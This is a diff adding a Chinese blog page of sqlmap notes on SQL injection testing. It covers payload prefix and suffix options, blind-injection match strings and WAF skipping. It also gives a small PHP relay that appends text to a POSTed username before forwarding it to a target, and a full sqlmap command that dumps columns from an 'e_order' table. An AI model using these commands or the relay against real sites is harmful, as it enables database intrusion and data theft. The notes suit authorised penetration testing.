@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>Sqlmap备忘录</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/sql-proxy.html" rel="bookmark"
+           title="Permalink to Sqlmap备忘录">Sqlmap备忘录</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-01-03T00:00:00+01:00">
+                <a href='#'>01/03/2017 </a>
+                <a href="/category/sql.html">SQL</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>2017-1-11更新：
+原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
+<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
+<p><a href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
+<blockquote>
+<p>The prefix (--prefix) and suffix (--suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
+</blockquote>
+<div class="highlight"><pre><span></span><span class="c1">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置</span>
+</pre></div>
+
+
+<h3>在注入测试的时候union查询用的是NULL?</h3>
+<blockquote>
+<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
+</blockquote>
+<h3>使用具体的payload</h3>
+<p>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter='ORDER BY'</code></p>
+<h3><code>--string</code> &amp; <code>--not-string</code></h3>
+<p>Blind injection的时候，有这样的选项：</p>
+<div class="highlight"><pre><span></span><span class="c1">--string</span>
+<span class="c1">--not-string</span>
+<span class="err">在</span><span class="n">true或者false要判断的字符</span>
+
+<span class="c1">--regexp 使用的正则表达</span>
+<span class="c1">--code 根据HTTP状态来判断</span>
+<span class="c1">--text-only 比较回应的文本</span>
+<span class="c1">--title 比较回应的title</span>
+
+<span class="err">其中作者说明了使用</span><span class="c1">--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)</span>
+
+<span class="c1">--string=&quot;Name\x0a\x09\x09Stephen&quot;</span>
+</pre></div>
+
+
+<h3>自动选择Y</h3>
+<p>注入的时候sqlmap会询问是Y或者N之类的，有这么一个选择可以：</p>
+<p><code>--answers='optimize=Y'</code></p>
+<p>另外一个是<code>--flush-session</code>刷新注入的session</p>
+<p>最后一段是作者的经验，往往这个最重要，OK。下一集作者会写几个例子，关注下。</p>
+<h2>---</h2>
+<p>不晓得能不能成，就记录东西啦，不管是菜刀还是sqlmap，走的流量都是http协议，
+最后判断的依据都是http页面上的内容。</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">set_time_limit</span><span class="ss">(</span><span class="mi">0</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">host</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="c1">;</span>
+$<span class="nv">useragent</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><span class="s2">&quot;</span><span class="c1">;</span>
+
+<span class="mh">$da</span><span class="nv">ta</span><span class="o">=</span>$<span class="nv">_POST</span><span class="c1">;</span>
+$<span class="nv">u</span> <span class="o">=</span> $<span class="nv">_POST</span>[<span class="s2">&quot;</span><span class="s">username</span><span class="s2">&quot;</span>]<span class="c1">;</span>
+$<span class="nv">u</span> <span class="o">=</span> $<span class="nv">u</span>.<span class="s2">&quot;</span><span class="s"> # between</span><span class="s2">&quot;</span><span class="c1">;</span>
+$<span class="nv">re</span> <span class="o">=</span> <span class="nv">array</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">username</span><span class="s2">&quot;</span> <span class="o">=&gt;</span> $<span class="nv">u</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">pack</span> <span class="o">=</span> <span class="nv">array_replace</span><span class="ss">(</span><span class="mh">$da</span><span class="nv">ta</span>,$<span class="nv">re</span><span class="ss">)</span><span class="c1">;</span>
+<span class="mh">$c</span><span class="nv">h</span> <span class="o">=</span> <span class="nv">curl_init</span><span class="ss">()</span><span class="c1">;</span>
+
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_URL</span>,$<span class="nv">host</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_RETURNTRANSFER</span>,<span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_POST</span>, <span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_POSTFIELDS</span>, $<span class="nv">pack</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_TIMEOUT</span>, <span class="mi">25</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_USERAGENT</span>, $<span class="nv">useragent</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">curl_setopt</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span>,<span class="nv">CURLOPT_HTTPHEADER</span>,<span class="nv">array</span><span class="ss">(</span>
+    <span class="s1">&#39;</span><span class="s">Accept-Language: zh-cn</span><span class="s1">&#39;</span>,
+    <span class="s1">&#39;</span><span class="s">Connection: Keep-Alive</span><span class="s1">&#39;</span>,
+    <span class="s2">&quot;</span><span class="s">referer: $host</span><span class="s2">&quot;</span><span class="ss">))</span><span class="c1">;</span>
+$<span class="k">return</span> <span class="o">=</span> <span class="nv">curl_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">h</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">echo</span> $<span class="k">return</span><span class="c1">;</span>
+?<span class="o">&gt;</span>
+</pre></div>
+
+
+<p>=====</p>
+<div class="highlight"><pre><span></span><span class="err">可以先</span><span class="c1">--count下看看总的数据量，然后再查看特定的内容</span>
+<span class="n">sqlmap</span> <span class="o">-</span><span class="n">r</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="mi">11</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">v</span> <span class="mi">5</span> <span class="c1">--technique E  --delay 3 --proxy=http://127.0.0.1:8080  --dbms=MySql  --dbs --skip-waf --dump -T e_order -C id,bid,uid --start &lt;&gt; --stop &lt;&gt;</span>
+</pre></div>
+
+
+<p>--force-ssl 强制https，在使用<code>-r</code>选项的时候非常有用</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
